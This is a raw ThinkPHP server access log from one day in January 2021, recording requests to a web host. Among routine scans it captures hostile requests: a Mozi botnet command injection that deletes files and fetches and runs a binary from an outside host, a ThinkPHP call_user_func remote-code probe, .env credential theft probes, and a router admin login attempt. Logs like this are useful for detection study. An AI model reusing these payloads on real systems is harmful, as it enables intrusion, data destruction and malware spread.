  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-language' => 'en-GB,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T05:15:17+08:00 ] 107.6.180.154 GET 101.37.13.45/
[运行时间：0.015235s] [吞吐率：65.64req/s] [内存消耗：1,759.26kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T05:21:41+08:00 ] 202.158.36.69 GET 101.37.13.45:80/
[运行时间：0.014745s] [吞吐率：67.82req/s] [内存消耗：1,758.87kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T05:28:02+08:00 ] 18.217.4.68 GET 101.37.13.45/.env
[运行时间：0.016805s] [吞吐率：59.51req/s] [内存消耗：1,832.48kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '.env',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T05:28:03+08:00 ] 18.217.4.68 POST 101.37.13.45/
[运行时间：0.014300s] [吞吐率：69.93req/s] [内存消耗：1,758.98kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '20',
)
[ info ] [ PARAM ] array (
  '0x' => 
  array (
    0 => 'androxgh0st',
  ),
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T06:42:31+08:00 ] 200.162.225.110 GET 101.37.13.45:80/
[运行时间：0.017487s] [吞吐率：57.19req/s] [内存消耗：1,758.87kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T07:08:34+08:00 ] 192.241.222.132 GET 101.37.13.45/portal/redlion
[运行时间：0.018532s] [吞吐率：53.96req/s] [内存消耗：1,831.94kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'portal',
    1 => 'redlion',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T08:20:42+08:00 ] 114.224.31.217 POST 101.37.13.45/?captcha
[运行时间：0.015922s] [吞吐率：62.81req/s] [内存消耗：1,760.26kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '76',
)
[ info ] [ PARAM ] array (
  'captcha' => '',
  'filter' => 
  array (
    0 => 'call_user_func',
  ),
  'method' => 'get',
  'get' => 
  array (
    0 => 'phpinfo',
  ),
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T09:01:46+08:00 ] 47.92.156.78 GET 101.37.13.45/
[运行时间：0.016025s] [吞吐率：62.40req/s] [内存消耗：1,759.34kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T10:31:19+08:00 ] 192.241.212.223 GET 101.37.13.45/actuator/health
[运行时间：0.017024s] [吞吐率：58.74req/s] [内存消耗：1,832.02kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'actuator',
    1 => 'health',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T14:07:13+08:00 ] 193.118.53.202 GET 101.37.13.45/
[运行时间：0.014986s] [吞吐率：66.73req/s] [内存消耗：1,759.23kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T14:14:41+08:00 ] 178.134.248.74 GET 101.37.13.45:80/
[运行时间：0.015195s] [吞吐率：65.81req/s] [内存消耗：1,758.86kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T15:14:09+08:00 ] 27.102.134.113 GET 101.37.13.45/
[运行时间：0.015806s] [吞吐率：63.27req/s] [内存消耗：1,759.23kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T15:24:24+08:00 ] 193.32.8.116 GET 101.37.13.45:80/
[运行时间：0.014910s] [吞吐率：67.07req/s] [内存消耗：1,758.80kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'te' => 'deflate,gzip;q=0.3',
  'connection' => 'TE, close',
  'host' => '101.37.13.45:80',
  'user-agent' => 'libwww-perl/6.49',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T15:25:02+08:00 ] 193.32.8.116 GET 101.37.13.45:80/
[运行时间：0.017097s] [吞吐率：58.49req/s] [内存消耗：1,758.80kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'te' => 'deflate,gzip;q=0.3',
  'connection' => 'TE, close',
  'host' => '101.37.13.45:80',
  'user-agent' => 'libwww-perl/6.49',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T16:13:56+08:00 ] 185.239.242.162 POST 101.37.13.45:80/boaform/admin/formLogin
[运行时间：0.019213s] [吞吐率：52.05req/s] [内存消耗：1,834.27kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'boaform',
    1 => 'admin',
    2 => 'formLogin',
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/71.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-GB,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'origin' => 'http://101.37.13.45:80',
  'connection' => 'keep-alive',
  'referer' => 'http://101.37.13.45:80/admin/login.asp',
  'upgrade-insecure-requests' => '1',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '29',
)
[ info ] [ PARAM ] array (
  'username' => 'admin',
  'psd' => 'Feefifofum',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T18:01:22+08:00 ] 58.248.114.87 GET 101.37.13.45:80/shell?cd+/tmp;rm+-rf+*;wget+http://58.248.114.87:35382/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
[运行时间：0.016239s] [吞吐率：61.58req/s] [内存消耗：1,833.26kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'shell',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'user-agent' => 'Hello, world',
  'host' => '101.37.13.45:80',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
  'cd_/tmp;rm_-rf_*;wget_http://58_248_114_87:35382/Mozi_a;chmod_777_Mozi_a;/tmp/Mozi_a_jaws' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T18:01:30+08:00 ] 77.247.127.140 GET 101.37.13.45/.env
[运行时间：0.017739s] [吞吐率：56.37req/s] [内存消耗：1,832.45kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '.env',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T18:01:31+08:00 ] 77.247.127.140 POST 101.37.13.45/
[运行时间：0.014814s] [吞吐率：67.50req/s] [内存消耗：1,759.01kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '20',
)
[ info ] [ PARAM ] array (
  '0x' => 
  array (
    0 => 'androxgh0st',
  ),
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T18:40:45+08:00 ] 192.241.195.53 GET 101.37.13.45/hudson
[运行时间：0.016577s] [吞吐率：60.32req/s] [内存消耗：1,831.87kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hudson',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T20:24:41+08:00 ] 183.91.64.26 GET 101.37.13.45:80/
[运行时间：0.014273s] [吞吐率：70.06req/s] [内存消耗：1,758.87kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T21:09:19+08:00 ] 192.241.218.186 GET 101.37.13.45/ReportServer
[运行时间：0.017576s] [吞吐率：56.90req/s] [内存消耗：1,831.88kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ReportServer',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T23:36:03+08:00 ] 209.141.60.195 GET 101.37.13.45:80/config/getuser?index=0
[运行时间：0.016938s] [吞吐率：59.04req/s] [内存消耗：1,833.66kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'config',
    1 => 'getuser',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-language' => 'en-GB,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  'index' => '0',
)
[ info ] [ LOG ] INIT File
